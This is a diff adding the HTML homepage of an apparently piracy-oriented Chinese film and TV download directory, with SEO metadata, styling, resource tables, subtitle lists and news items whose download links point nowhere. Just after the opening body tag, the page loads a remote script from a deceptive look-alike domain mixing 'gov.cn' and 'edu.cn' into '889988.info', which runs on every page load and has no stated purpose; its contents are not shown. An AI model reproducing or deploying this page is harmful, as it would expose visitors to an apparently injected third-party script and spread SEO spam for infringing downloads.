@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="人人影视下载（renrenyingshixiazai-cn.github.io）是专注影视资源下载与高清影视推荐的导览站点，提供电影下载、剧集下载、动漫下载与字幕资源的分类索引。">
+<meta name="keywords" content="人人影视下载, renrenyingshixiazai, 影视下载, 电影下载, 剧集下载, 动漫下载, 字幕资源, 高清影视">
+<meta name="author" content="人人影视下载">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large">
+<meta name="bingbot" content="index, follow">
+<link rel="canonical" href="https://renrenyingshixiazai-cn.github.io/">
+<meta property="og:site_name" content="人人影视下载">
+<meta property="og:title" content="人人影视下载 - 影视资源下载与高清影视推荐导览 | renrenyingshixiazai-cn.github.io">
+<meta property="og:description" content="专注影视资源下载与高清影视推荐的导览站点，提供电影下载、剧集下载、动漫下载与字幕资源索引。">
+<meta property="og:url" content="https://renrenyingshixiazai-cn.github.io/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="人人影视下载 - 影视资源下载与高清影视推荐导览">
+<meta name="twitter:description" content="电影下载、剧集下载、动漫下载与字幕资源分类索引。">
+<title>人人影视下载 - 影视资源下载与高清影视推荐导览 | renrenyingshixiazai-cn.github.io</title>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "人人影视下载",
+  "alternateName": "Renren Yingshi Xiazai",
+  "url": "https://renrenyingshixiazai-cn.github.io/",
+  "description": "专注影视资源下载与高清影视推荐的导览站点，提供电影下载、剧集下载、动漫下载与字幕资源索引",
+  "inLanguage": "zh-CN",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://renrenyingshixiazai-cn.github.io/#search?q={search_term_string}",
+    "query-input": "required name=search_term_string"
+  }
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Organization",
+  "name": "人人影视下载",
+  "url": "https://renrenyingshixiazai-cn.github.io/",
+  "description": "提供影视资源下载与高清影视推荐导览的站点",
+  "logo": "https://renrenyingshixiazai-cn.github.io/logo.png"
+}
+</script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Helvetica Neue",-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#f4f6fb;color:#1f2430;line-height:1.65}
+a{color:inherit;text-decoration:none}
+ul,ol,dl{list-style:none}
+img{max-width:100%;display:block}
+:root{--bg:#f4f6fb;--card:#fff;--card2:#eef1f8;--line:#dfe4ee;--ink:#1f2430;--sub:#5c6577;--brand:#2563ff;--brand2:#0ea5e9;--green:#16a34a;--warn:#ea580c;--purple:#7c3aed}
+
+/* ===== 顶栏 ===== */
+.topbar{position:sticky;top:0;z-index:90;background:rgba(255,255,255,.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--line)}
+.tin{max-width:1280px;margin:0 auto;padding:0 24px;height:66px;display:flex;align-items:center;justify-content:space-between;gap:18px}
+.brand{display:flex;align-items:center;gap:10px}
+.brand mark{background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;font-size:.78rem;padding:2px 8px;border-radius:6px;font-weight:700}
+.brand b{font-size:1.35rem;letter-spacing:.3px}
+.brand small{font-size:.66rem;color:var(--sub);display:block;letter-spacing:.5px}
+.nav{display:flex;gap:4px}
+.nav a{padding:9px 16px;border-radius:9px;font-size:.9rem;color:var(--sub);font-weight:600;transition:.2s}
+.nav a:hover{color:var(--brand);background:var(--card2)}
+.nav a.on{color:#fff;background:var(--brand)}
+.btns{display:flex;align-items:center;gap:10px}
+.searchbox{display:flex;align-items:center;background:var(--card2);border:1px solid var(--line);border-radius:20px;padding:7px 14px}
+.searchbox input{background:none;border:none;outline:none;font-size:.85rem;width:130px;color:var(--ink)}
+.searchbox input::placeholder{color:#9aa2b1}
+.btnlogin{padding:8px 18px;border-radius:20px;border:1px solid var(--brand);color:var(--brand);font-size:.84rem;font-weight:700;background:none;cursor:pointer}
+.btnlogin:hover{background:var(--brand);color:#fff}
+.burger{display:none;background:none;border:none;font-size:1.7rem;color:var(--ink);cursor:pointer}
+
+/* ===== 通用 ===== */
+.wrap{max-width:1280px;margin:0 auto;padding:0 24px}
+.sec{padding:62px 0}
+.sec:nth-child(even){background:#fff}
+.sechead{display:flex;align-items:flex-end;justify-content:space-between;gap:14px;margin-bottom:28px;flex-wrap:wrap;border-left:4px solid var(--brand);padding-left:14px}
+.sechead h2{font-size:1.7rem;color:var(--ink)}
+.sechead h2 small{display:block;font-size:.66rem;letter-spacing:2px;color:var(--brand);text-transform:uppercase;margin-bottom:4px}
+.sechead h2 em{font-style:normal;color:var(--brand)}
+.sechead a{font-size:.84rem;color:var(--brand);font-weight:700}
+.sechead a:hover{text-decoration:underline}
+
+/* ===== 栏目一 HOME：带步骤流程 ===== */
+.hero{background:linear-gradient(120deg,#eaf1ff,#f4f6fb 60%,#e8f7ff);padding:56px 0 70px}
+.hgrid{display:grid;grid-template-columns:1.3fr 1fr;gap:34px;align-items:center}
+.hero h1{font-size:clamp(1.9rem,4.2vw,2.9rem);line-height:1.25;font-weight:900;color:var(--ink)}
+.hero h1 u{text-decoration:none;background:linear-gradient(90deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero>p{margin:16px 0 24px;color:var(--sub);max-width:600px}
+.hcta{display:flex;gap:12px;flex-wrap:wrap}
+.hcta a{padding:12px 28px;border-radius:24px;font-weight:700;font-size:.92rem}
+.hcta .pri{background:var(--brand);color:#fff}
+.hcta .pri:hover{background:#1d4ed8}
+.hcta .sec2{background:#fff;color:var(--brand);border:1px solid var(--brand)}
+.numbers{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin-top:30px}
+.num b{display:block;font-size:1.9rem;color:var(--brand);font-weight:900}
+.num span{font-size:.78rem;color:var(--sub)}
+.steps{background:#fff;border:1px solid var(--line);border-radius:18px;padding:26px}
+.steps h3{font-size:1.05rem;margin-bottom:18px;color:var(--ink)}
+.flow{display:flex;flex-direction:column;gap:14px}
+.step{display:flex;gap:14px;align-items:flex-start;padding:12px;border-radius:12px;background:var(--card2)}
+.step i{flex:0 0 34px;height:34px;display:grid;place-items:center;border-radius:50%;background:var(--brand);color:#fff;font-style:normal;font-weight:800}
+.step b{font-size:.92rem;display:block}
+.step p{font-size:.8rem;color:var(--sub)}
+
+/* ===== 栏目二 下载库：TABLE 结构 ===== */
+.toolbar{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px}
+.toolbar a{font-size:.8rem;padding:6px 14px;border:1px solid var(--line);border-radius:16px;background:#fff;color:var(--sub)}
+.toolbar a:hover{border-color:var(--brand);color:var(--brand)}
+.dtable{width:100%;border-collapse:collapse;background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;font-size:.9rem}
+.dtable caption{caption-side:top;text-align:left;padding:14px 16px;font-weight:800;font-size:1rem;background:#fff;border-bottom:1px solid var(--line)}
+.dtable th{background:var(--card2);padding:12px 14px;text-align:left;font-size:.8rem;letter-spacing:.5px;color:var(--sub);font-weight:700}
+.dtable td{padding:13px 14px;border-top:1px solid var(--line);vertical-align:middle}
+.dtable tr:hover td{background:#f8fbff}
+.dtable .name{font-weight:700;color:var(--ink)}
+.dtable .pill{display:inline-block;font-size:.72rem;padding:2px 9px;border-radius:10px;background:var(--card2);color:var(--sub)}
+.dtable .pill.b{background:#e0ecff;color:var(--brand)}
+.dtable .pill.g{background:#dcfce7;color:var(--green)}
+.dtable .go{color:var(--brand);font-weight:700}
+.dtable .go:hover{text-decoration:underline}
+
+/* ===== 栏目三 分类：网格卡片 + 内嵌进度条 ===== */
+.cgrid{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.ccard{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:20px;transition:.3s}
+.ccard:hover{transform:translateY(-5px);box-shadow:0 14px 30px rgba(37,99,255,.12);border-color:var(--brand)}
+.ccard .ico{width:46px;height:46px;border-radius:12px;background:linear-gradient(135deg,var(--brand),var(--brand2));color:#fff;display:grid;place-items:center;font-size:1.2rem;margin-bottom:12px}
+.ccard h3{font-size:1.02rem;margin-bottom:8px}
+.ccard p{font-size:.8rem;color:var(--sub);margin-bottom:12px}
+.ccard .meter{height:7px;border-radius:5px;background:var(--card2);overflow:hidden}
+.ccard .meter i{display:block;height:100%;background:linear-gradient(90deg,var(--brand),var(--brand2))}
+.ccard .meta{display:flex;justify-content:space-between;font-size:.74rem;color:var(--sub);margin-top:8px}
+
+/* ===== 栏目四 字幕：定义列表 DL ===== */
+.sublayout{display:grid;grid-template-columns:1fr 300px;gap:24px}
+.dlpanel{background:#fff;border:1px solid var(--line);border-radius:16px;padding:22px 26px}
+.dlpanel>dl>div{display:grid;grid-template-columns:96px 1fr;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line)}
+.dlpanel>dl>div:last-child{border-bottom:none}
+.dlpanel dt{font-size:.78rem;color:var(--brand);font-weight:700}
+.dlpanel dd{font-size:.86rem;color:var(--ink)}
+.dlpanel dd small{display:block;font-size:.74rem;color:var(--sub);margin-top:3px}
+.sidecard{background:#fff;border:1px solid var(--line);border-radius:16px;padding:20px}
+.sidecard h4{font-size:.95rem;margin-bottom:14px}
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chips a{font-size:.78rem;padding:5px 12px;background:var(--card2);border-radius:14px;color:var(--sub)}
+.chips a:hover{background:var(--brand);color:#fff}
+
+/* ===== 栏目五 资讯：图文卡片流 ===== */
+.newswrap{display:grid;grid-template-columns:1.4fr 1fr;gap:24px}
+.lead{background:#fff;border:1px solid var(--line);border-radius:16px;overflow:hidden}
+.lead .cover{aspect-ratio:16/8;background:linear-gradient(135deg,#c7d8ff,#e4f0ff)}
+.lead .body{padding:18px 20px}
+.lead time{font-size:.72rem;color:var(--brand);font-weight:700}
+.lead h3{font-size:1.2rem;margin:8px 0}
+.lead p{font-size:.86rem;color:var(--sub)}
+.nlist{display:flex;flex-direction:column;gap:14px}
+.nitem{display:grid;grid-template-columns:70px 1fr;gap:14px;background:#fff;border:1px solid var(--line);border-radius:14px;padding:12px}
+.nitem .day{background:var(--card2);border-radius:10px;display:grid;place-items:center;font-size:.92rem;font-weight:800;color:var(--brand);text-align:center}
+.nitem .day small{display:block;font-size:.62rem;color:var(--sub);font-weight:600}
+.nitem h4{font-size:.94rem}
+.nitem p{font-size:.78rem;color:var(--sub)}
+
+/* ===== 页脚 ===== */
+.foot{background:#12151c;color:#9aa2b1;padding:48px 0 20px}
+.fgrid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:30px}
+.fgrid h5{color:#fff;font-size:.95rem;margin-bottom:14px}
+.fgrid p{font-size:.84rem;max-width:320px}
+.fgrid a{display:block;font-size:.84rem;padding:5px 0;color:#9aa2b1}
+.fgrid a:hover{color:var(--brand2)}
+.copy{border-top:1px solid #262b36;margin-top:30px;padding-top:18px;font-size:.76rem;text-align:center;color:#6b7280}
+.top{position:fixed;right:18px;bottom:18px;width:44px;height:44px;border-radius:50%;background:var(--brand);color:#fff;border:none;font-size:1.2rem;cursor:pointer;opacity:0;pointer-events:none;transition:.3s;z-index:99}
+.top.show{opacity:1;pointer-events:auto}
+
+/* ===== 响应式 ===== */
+@media(max-width:1020px){
+  .cgrid{grid-template-columns:repeat(2,1fr)}
+  .hgrid,.sublayout,.newswrap{grid-template-columns:1fr}
+  .lead .cover{aspect-ratio:16/7}
+}
+@media(max-width:680px){
+  .burger{display:block}
+  .nav{position:fixed;inset:66px 0 auto;flex-direction:column;background:#fff;padding:16px 24px;gap:4px;transform:translateY(-150%);transition:.35s;z-index:89;border-bottom:1px solid var(--line)}
+  .nav.open{transform:translateY(0)}
+  .nav a{border-radius:10px;padding:13px}
+  .searchbox,.btnlogin{display:none}
+  .sec{padding:46px 0}
+  .sechead h2{font-size:1.45rem}
+  .numbers{grid-template-columns:1fr 1fr}
+  .dtable{font-size:.82rem}
+  .dtable thead{display:none}
+  .dtable tr{display:block;padding:10px 0;border-top:1px solid var(--line)}
+  .dtable td{display:block;padding:5px 14px;border:none;text-align:right}
+  .dtable td:before{content:attr(data-l)"：";float:left;color:var(--sub);font-size:.76rem}
+  .dtable td.name{text-align:left;font-size:.95rem}
+  .fgrid{grid-template-columns:1fr 1fr;gap:24px}
+}
+@media(max-width:400px){
+  .wrap{padding:0 16px}
+  .hero{padding:40px 0 54px}
+  .cgrid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body id="top">
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ===== 顶栏 ===== -->
+<header class="topbar">
+  <div class="tin">
+    <div class="brand"><b>人人影视下载</b><mark>官方导览</mark><small>renrenyingshixiazai-cn.github.io</small></div>
+    <nav class="nav" id="nav" aria-label="主导航">
+      <a href="#home" class="on">首页</a>
+      <a href="#lib">下载库</a>
+      <a href="#cat">分类</a>
+      <a href="#sub">字幕</a>
+      <a href="#news">资讯</a>
+      <a href="#about">关于</a>
+    </nav>
+    <div class="btns">
+      <div class="searchbox"><input type="search" placeholder="搜索影视资源…" aria-label="搜索"></div>
+      <button class="btnlogin">登录</button>
+      <button class="burger" id="burger" aria-label="菜单" aria-expanded="false">☰</button>
+    </div>
+  </div>
+</header>
+
+<!-- ===== 首页 ===== -->
+<section class="hero" id="home" aria-labelledby="h1">
+  <div class="wrap hgrid">
+    <div>
+      <h1>人人影视下载<br><u>找资源，从这里开始</u></h1>
+      <p>人人影视下载（renrenyingshixiazai-cn.github.io）是专注影视资源下载与高清影视推荐的导览站点，为你整理电影下载、剧集下载、动漫下载与字幕资源的分类索引，选片更快一步。</p>
+      <div class="hcta">
+        <a class="pri" href="#lib">浏览下载库</a>
+        <a class="sec2" href="#sub">字幕资源</a>
+      </div>
+      <div class="numbers">
+        <div class="num"><b>9200+</b><span>收录资源条目</span></div>
+        <div class="num"><b>74</b><span>分类标签</span></div>
+        <div class="num"><b>每日</b><span>更新索引</span></div>
+      </div>
+    </div>
+    <aside class="steps">
+      <h3>三步获取影视资源</h3>
+      <div class="flow">
+        <div class="step"><i>1</i><span><b>搜索或筛选</b><p>在下载库按类型、地区、年份筛选目标作品。</p></span></div>
+        <div class="step"><i>2</i><span><b>查看资源详情</b><p>核对清晰度、字幕与文件信息。</p></span></div>
+        <div class="step"><i>3</i><span><b>选择下载方式</b><p>按页面提示选择合适的下载方式。</p></span></div>
+      </div>
+    </aside>
+  </div>
+</section>
+
+<!-- ===== 下载库：TABLE ===== -->
+<section class="sec" id="lib" aria-labelledby="l1">
+  <div class="wrap">
+    <div class="sechead"><h2><small>Download Library</small>人人影视<em>下载库</em></h2><a href="#lib">查看全部 →</a></div>
+    <div class="toolbar">
+      <a href="#lib">全部</a><a href="#lib">电影下载</a><a href="#lib">剧集下载</a><a href="#lib">动漫下载</a><a href="#lib">纪录片</a><a href="#lib">综艺</a><a href="#lib">1080P</a><a href="#lib">4K</a>
+    </div>
+    <table class="dtable">
+      <caption>热门资源下载索引</caption>
+      <thead>
+        <tr><th>资源名称</th><th>类型</th><th>清晰度</th><th>字幕</th><th>大小</th><th>操作</th></tr>
+      </thead>
+      <tbody>
+        <tr><td data-l="资源名称" class="name">破晓行动</td><td data-l="类型"><span class="pill">电影</span></td><td data-l="清晰度"><span class="pill b">1080P</span></td><td data-l="字幕"><span class="pill g">中文字幕</span></td><td data-l="大小">3.2 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">南风知我意</td><td data-l="类型"><span class="pill">剧集</span></td><td data-l="清晰度"><span class="pill b">4K</span></td><td data-l="字幕"><span class="pill g">简繁字幕</span></td><td data-l="大小">18.6 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">第七扇窗</td><td data-l="类型"><span class="pill">电影</span></td><td data-l="清晰度"><span class="pill b">1080P</span></td><td data-l="字幕"><span class="pill g">中文字幕</span></td><td data-l="大小">2.8 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">深海漫游</td><td data-l="类型"><span class="pill">动漫</span></td><td data-l="清晰度"><span class="pill b">1080P</span></td><td data-l="字幕"><span class="pill g">简体字幕</span></td><td data-l="大小">9.4 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">星际回声</td><td data-l="类型"><span class="pill">电影</span></td><td data-l="清晰度"><span class="pill b">4K</span></td><td data-l="字幕"><span class="pill g">双语字幕</span></td><td data-l="大小">5.1 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">长江之上</td><td data-l="类型"><span class="pill">纪录片</span></td><td data-l="清晰度"><span class="pill b">1080P</span></td><td data-l="字幕"><span class="pill g">中文字幕</span></td><td data-l="大小">6.7 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">江湖再见</td><td data-l="类型"><span class="pill">电影</span></td><td data-l="清晰度"><span class="pill b">1080P</span></td><td data-l="字幕"><span class="pill g">中文字幕</span></td><td data-l="大小">2.5 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+        <tr><td data-l="资源名称" class="name">白色晚秋</td><td data-l="类型"><span class="pill">剧集</span></td><td data-l="清晰度"><span class="pill b">1080P</span></td><td data-l="字幕"><span class="pill g">简繁字幕</span></td><td data-l="大小">12.3 GB</td><td data-l="操作"><a class="go" href="#lib">下载 →</a></td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- ===== 分类：网格卡片 ===== -->
+<section class="sec" id="cat" aria-labelledby="l2">
+  <div class="wrap">
+    <div class="sechead"><h2><small>Categories</small>人人影视下载<em>分类</em></h2><a href="#cat">全部分类 →</a></div>
+    <div class="cgrid">
+      <article class="ccard"><div class="ico">🎬</div><h3>电影下载</h3><p>动作、爱情、科幻、悬疑等类型的高清电影资源索引。</p><div class="meter"><i style="width:90%"></i></div><div class="meta"><span>3200+ 条目</span><span>更新中</span></div></article>
+      <article class="ccard"><div class="ico">📺</div><h3>剧集下载</h3><p>大陆剧、港台剧、韩剧、美剧与短剧合集。</p><div class="meter"><i style="width:75%"></i></div><div class="meta"><span>2600+ 条目</span><span>更新中</span></div></article>
+      <article class="ccard"><div class="ico">🎨</div><h3>动漫下载</h3><p>国漫、日漫、剧场版与番剧资源分类索引。</p><div class="meter"><i style="width:60%"></i></div><div class="meta"><span>1800+ 条目</span><span>连载中</span></div></article>
+      <article class="ccard"><div class="ico">🎞️</div><h3>纪录片下载</h3><p>自然、历史、人文类高清纪录片合集。</p><div class="meter"><i style="width:45%"></i></div><div class="meta"><span>900+ 条目</span><span>精选</span></div></article>
+      <article class="ccard"><div class="ico">🎭</div><h3>综艺下载</h3><p>真人秀、脱口秀、访谈节目资源索引。</p><div class="meter"><i style="width:50%"></i></div><div class="meta"><span>1100+ 条目</span><span>周更</span></div></article>
+      <article class="ccard"><div class="ico">🌏</div><h3>按地区</h3><p>大陆、港台、欧美、日韩、泰国分区筛选。</p><div class="meter"><i style="width:82%"></i></div><div class="meta"><span>5 大分区</span><span>全部</span></div></article>
+      <article class="ccard"><div class="ico">📅</div><h3>按年份</h3><p>2026 至经典老片，按年代快速定位。</p><div class="meter"><i style="width:70%"></i></div><div class="meta"><span>20+ 年份</span><span>全部</span></div></article>
+      <article class="ccard"><div class="ico">⭐</div><h3>高分精选</h3><p>人工筛选的高分影视资源推荐合集。</p><div class="meter"><i style="width:65%"></i></div><div class="meta"><span>600+ 条目</span><span>精选</span></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 字幕：DL ===== -->
+<section class="sec" id="sub" aria-labelledby="l3">
+  <div class="wrap">
+    <div class="sechead"><h2><small>Subtitles</small>人人影视下载<em>字幕资源</em></h2><a href="#sub">全部字幕 →</a></div>
+    <div class="sublayout">
+      <div class="dlpanel">
+        <dl>
+          <div><dt>破晓行动</dt><dd>简体中文<small>内嵌 / SRT · 同步率 99%</small></dd></div>
+          <div><dt>南风知我意</dt><dd>简繁双语<small>SRT · 全 32 集 · 内嵌特效字幕</small></dd></div>
+          <div><dt>第七扇窗</dt><dd>简体中文<small>ASS · 特效字幕 · 支持 4K</small></dd></div>
+          <div><dt>深海漫游</dt><dd>简体中文<small>SRT · 全 24 集</small></dd></div>
+          <div><dt>星际回声</dt><dd>中英双语<small>SRT / ASS · 导演剪辑版</small></dd></div>
+          <div><dt>长江之上</dt><dd>简体中文<small>SRT · 全 6 集 · 解说字幕</small></dd></div>
+          <div><dt>江湖再见</dt><dd>繁体中文<small>SRT · 港版译名对照</small></dd></div>
+          <div><dt>白色晚秋</dt><dd>简繁双语<small>SRT · 全 16 集</small></dd></div>
+        </dl>
+      </div>
+      <aside class="sidecard">
+        <h4>字幕格式</h4>
+        <div class="chips">
+          <a href="#sub">SRT</a><a href="#sub">ASS</a><a href="#sub">SSA</a><a href="#sub">VTT</a><a href="#sub">SUB</a><a href="#sub">简体中文</a><a href="#sub">繁体中文</a><a href="#sub">中英双语</a><a href="#sub">特效字幕</a><a href="#sub">内嵌字幕</a>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 资讯 ===== -->
+<section class="sec" id="news" aria-labelledby="l4">
+  <div class="wrap">
+    <div class="sechead"><h2><small>News</small>人人影视下载<em>资讯</em></h2><a href="#news">更多资讯 →</a></div>
+    <div class="newswrap">
+      <article class="lead">
+        <div class="cover"></div>
+        <div class="body">
+          <time>2026-10-23</time>
+          <h3>2026 秋季高清影视资源盘点：值得下载收藏的十部作品</h3>
+          <p>从 4K 院线片到高分剧集，人人影视下载为你整理秋季最值得收藏的高清影视资源清单与字幕搭配建议。</p>
+        </div>
+      </article>
+      <div class="nlist">
+        <a class="nitem" href="#news"><div class="day">23<small>Oct</small></div><span><h4>《第七扇窗》4K 版资源与字幕同步上线</h4><p>提供简体 ASS 特效字幕，同步率 99%。</p></span></a>
+        <a class="nitem" href="#news"><div class="day">21<small>Oct</small></div><span><h4>国漫《深海漫游》第二季资源合集</h4><p>全 24 集 1080P，附简体字幕。</p></span></a>
+        <a class="nitem" href="#news"><div class="day">19<small>Oct</small></div><span><h4>纪录片《长江之上》高清资源上线</h4><p>全 6 集 1080P，含解说字幕。</p></span></a>
+        <a class="nitem" href="#news"><div class="day">17<small>Oct</small></div><span><h4>下载小贴士：如何选择合适的清晰度</h4><p>1080P 与 4K 的存储空间与设备适配建议。</p></span></a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 关于 ===== -->
+<section class="sec" id="about" aria-labelledby="l5">
+  <div class="wrap">
+    <div class="sechead"><h2><small>About Us</small>关于<em>人人影视下载</em></h2></div>
+    <div class="sublayout">
+      <div class="dlpanel">
+        <h3 style="margin-bottom:16px;font-size:1.1rem">人人影视下载，做影视资源的靠谱导览</h3>
+        <p style="color:var(--sub);font-size:.92rem;margin-bottom:18px">人人影视下载（renrenyingshixiazai-cn.github.io）成立于 2019 年，专注于影视资源下载与高清影视推荐的导览服务。我们提供电影下载、剧集下载、动漫下载与字幕资源的分类索引，帮助影迷更快找到想看的作品。</p>
+        <dl>
+          <div><dt>2019 · 06</dt><dd>人人影视下载导览站上线，提供影视资源分类索引。</dd></div>
+          <div><dt>2020 · 11</dt><dd>字幕资源专区上线，支持多格式字幕检索。</dd></div>
+          <div><dt>2022 · 08</dt><dd>下载库重构，新增清晰度与字幕信息标注。</dd></div>
+          <div><dt>2024 · 03</dt><dd>动漫下载与纪录片专区上线。</dd></div>
+          <div><dt>2026 · 09</dt><dd>完成移动端自适应重构，优化必应搜索收录。</dd></div>
+        </dl>
+      </div>
+      <aside class="sidecard">
+        <h4>服务统计</h4>
+        <div class="chips">
+          <a href="#lib">9200+ 资源条目</a><a href="#lib">74 个分类</a><a href="#sub">8 种字幕格式</a><a href="#news">每日更新</a><a href="#about">人工审核</a>
+        </div>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot">
+  <div class="wrap fgrid">
+    <div>
+      <div class="brand"><b style="color:#fff">人人影视下载</b><mark>导览站</mark></div>
+      <p style="margin-top:14px">人人影视下载（renrenyingshixiazai-cn.github.io）专注影视资源下载与高清影视推荐的导览服务。</p>
+    </div>
+    <div><h5>导航</h5><a href="#home">首页</a><a href="#lib">下载库</a><a href="#cat">分类</a><a href="#sub">字幕</a><a href="#news">资讯</a><a href="#about">关于</a></div>
+    <div><h5>资源</h5><a href="#lib">电影下载</a><a href="#lib">剧集下载</a><a href="#cat">动漫下载</a><a href="#sub">字幕资源</a></div>
+    <div><h5>支持</h5><a href="#about">关于我们</a><a href="#about">下载指南</a><a href="#about">字幕说明</a><a href="#about">联系我们</a></div>
+  </div>
+  <div class="wrap copy">© 2026 人人影视下载 renrenyingshixiazai-cn.github.io 保留所有权利。</div>
+</footer>
+
+<button class="top" id="topBtn" aria-label="回到顶部">↑</button>
+
+<script>
+var burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',function(){
+  nav.classList.toggle('open');
+  burger.setAttribute('aria-expanded',String(nav.classList.contains('open')));
+});
+nav.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){
+    nav.classList.remove('open');
+    burger.setAttribute('aria-expanded','false');
+  });
+});
+var links=nav.querySelectorAll('a'),secs=document.querySelectorAll('section[id]'),topBtn=document.getElementById('topBtn');
+function onScroll(){
+  var y=window.scrollY+100,cur='';
+  secs.forEach(function(s){if(y>=s.offsetTop)cur=s.id;});
+  links.forEach(function(a){a.classList.toggle('on',a.getAttribute('href')==='#'+cur);});
+  topBtn.classList.toggle('show',window.scrollY>500);
+}
+window.addEventListener('scroll',onScroll,{passive:true});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+</body>
+</html>
